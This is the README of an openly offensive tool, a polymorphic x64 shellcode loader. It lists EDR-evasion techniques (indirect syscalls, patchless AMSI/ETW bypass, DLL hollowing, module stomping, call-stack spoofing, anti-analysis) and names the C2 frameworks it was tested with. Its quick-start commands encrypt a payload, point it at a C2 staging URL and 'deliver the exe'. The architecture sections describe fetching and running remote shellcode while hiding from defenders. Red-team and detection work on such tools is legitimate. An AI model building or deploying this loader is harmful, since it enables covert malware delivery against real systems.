<div align="center">

```
┌─┐┌─┐┬─┐┌─┐  ─  ┬  ┌─┐┌─┐┌┬┐┌─┐┬─┐
┌─┘├┤ ├┬┘│ │     │  │ │├─┤ ││├┤ ├┬┘
└─┘└─┘┴└─└─┘  ─  ┴─┘└─┘┴ ┴─┴┘└─┘┴└─
```

**Polymorphic x64 shellcode loader**

Zero CRT. Zero static signatures. Zero trace in the call stack.

<br/>

[![Arch](https://img.shields.io/badge/arch-x64-0d1117?style=for-the-badge&logo=windows&logoColor=white)](/)
[![Lang](https://img.shields.io/badge/C_|_MASM-0d1117?style=for-the-badge&logo=c&logoColor=white)](/)
[![Size](https://img.shields.io/badge/~9KB-0d1117?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PHRleHQgeD0iMCIgeT0iMTQiIGZpbGw9IndoaXRlIiBmb250LXNpemU9IjEyIj7wn5ONPC90ZXh0Pjwvc3ZnPg==)](/)
[![CRT](https://img.shields.io/badge/CRT--free-0d1117?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/MIT-0d1117?style=for-the-badge)](LICENSE)

---

*Every build produces a unique binary — nothing matches across compilations.*

</div>

<br/>

## Overview

Most loaders get flagged because they ship the same binary. **zero-loader** regenerates all cryptographic material on every build — keys, nonces, string encoding, PE metadata. No two compilations share a hash.

**Tested with:** Cobalt Strike, Sliver, Adaptix C2, Metasploit

<br/>

## Features

> **Evasion**

| | |
|:--|:--|
| **Indirect Syscalls** | SSN extraction from ntdll + hooked-stub fallback. 64 `syscall;ret` gadgets pooled, randomly selected per call via RDTSC |
| **Patchless AMSI/ETW** | VEH + hardware breakpoints (DR0/DR1) via `NtContinue` — zero bytes modified, passes integrity checks |
| **Phantom DLL Hollowing** | NTFS transaction → write to section → rollback. EDR sees legitimate DLL-backed memory |
| **Module Stomping** | Overwrite signed DLL `.text` section. Memory attributed to a Microsoft binary |
| **Call Stack Spoofing** | `call rbx` gadget in ntdll + thread pool trampoline. All frames resolve to legitimate modules |
| **Anti-Analysis** | PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing delta |
| **IAT Camouflage** | Dead-code benign imports the optimizer cannot eliminate |
| **Post-Exec Cleanup** | Removes VEH, clears DR0/DR1, wipes keys/URLs/nonces before beacon runs |

> **Crypto & Staging**

| | |
|:--|:--|
| **Chaskey-12 CTR** | ARX block cipher — pure ALU, no S-boxes, no lookup tables, no RC4 signatures |
| **LZNT1 Compression** | Compressed before encryption, decompressed at runtime via ntdll |
| **Polymorphic Strings** | 4-byte rotating XOR across 25+ strings, keys regenerated every build |
| **PE Mutation** | TimeDateStamp, Rich header, section padding, checksum — randomized post-build |
| **HTTPS Staging** | Dynamic WinINet + `InternetCrackUrlA` + self-signed cert bypass |
| **W^X Memory** | `PAGE_EXECUTE_READ` default. `RWX_SHELLCODE` flag for Go-based implants |

<br/>

## Quick Start

```bash
# 1  Encrypt & compress shellcode
python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat

# 2  Build
build.bat

# 3  Deploy — upload data.enc to staging server, deliver the exe
```

> Re-run steps 1 & 2 for a completely new binary.

<details>
<summary><b>Build Flags</b></summary>

<br/>

Edit `Common.h`:

| Flag | Default | Purpose |
|:-----|:--------|:--------|
| `DEBUG` | Off | Logging to `debug.log`, skips anti-analysis |
| `RWX_SHELLCODE` | Off | `PAGE_EXECUTE_READWRITE` for Go/Sliver |

</details>

<details>
<summary><b>Requirements</b></summary>

<br/>

- Windows 10/11 x64
- Visual Studio 2022+ (MSVC + ml64)
- Python 3.x

</details>

<br/>

## Architecture

### Execution Chain

```
Main()
 │
 ├─ IatCamouflage              pad IAT with benign imports
 ├─ AntiAnalysis               PEB · NtGlobalFlag · RDTSC
 ├─ InitializeNtSyscalls       SSN extraction + 64 gadget pool
 ├─ InitializeWinApis          PEB walk → kernel32 → JOAAT resolve
 ├─ PatchlessAmsiEtw           DR0 = EtwEventWrite
 │                              DR1 = AmsiScanBuffer
 ├─ BruteForceDecryption       recover Chaskey key
 ├─ DownloadPayload            HTTPS GET → encrypted blob
 ├─ ChaskeyCtrDecrypt          in-place decryption
 ├─ DecompressPayload          LZNT1 via RtlDecompressBuffer
 │
 ├─ ┌ PhantomDllHollow ─────── NTFS txn → SEC_IMAGE → rollback
 ├─ │ ModuleStomp ──────────── overwrite signed DLL .text
 ├─ └ NtAllocateVirtualMemory  private RW → RX  (last resort)
 │
 ├─ CleanupEvasion             wipe VEH · DR regs · keys · URLs
 ├─ FindCallGadget             FF D3 (call rbx) in ntdll
 ├─ SetSpoofTarget             configure ASM trampoline
 ├─ TpAllocWork / TpPostWork   thread pool execution
 └─ NtDelayExecution           keep-alive via indirect syscall
```

### Call Stack

```
 RIP  shellcode           ← phantom/stomped DLL .text (signed)
  ↓   call rbx gadget     ← ntdll
  ↓   TppWorkpExecute     ← ntdll
  ↓   TppWorkerThread     ← ntdll
  ↓   RtlUserThreadStart  ← ntdll
```

Every frame resolves to a legitimate module.

### Encryption Pipeline

```
  Build time                              Runtime
  ──────────                              ───────

  shellcode.bin                     HTTPS download
       │                                 │
  LZNT1 compress                    Chaskey-CTR decrypt
       │                                 │
  Chaskey-CTR encrypt ─→ data.enc ─→ LZNT1 decompress
       │                                 │
  key protection                    brute-force recovery
  (XOR + offset)
       │
  Payload.h
  (randomized keys, nonce, strings)
```

<br/>

## Project Layout

```
main.c              orchestrates the execution chain
Syscalls.h/.c       indirect syscall engine · SSN + gadget pool
AsmStub.asm         x64 MASM · RunSyscall · SpoofCallback
WinApi.c            PEB walking · JOAAT hashing · CRT stubs
Evasion.c           patchless AMSI/ETW · anti-analysis · cleanup
Stomper.c           phantom hollowing · module stomping · gadgets
Crypt.c             Chaskey-12 CTR · LZNT1 · key recovery
Staging.c           HTTPS staging · cert bypass
Common.h            defines · hashes · typedefs · macros
Structs.h           undocumented NT structures
Payload.h           auto-generated (never edit)
Encrypt.py          encryption + compression + obfuscation
Mutate.py           post-build PE metadata randomizer
build.bat           ml64 → cl → Mutate.py
```
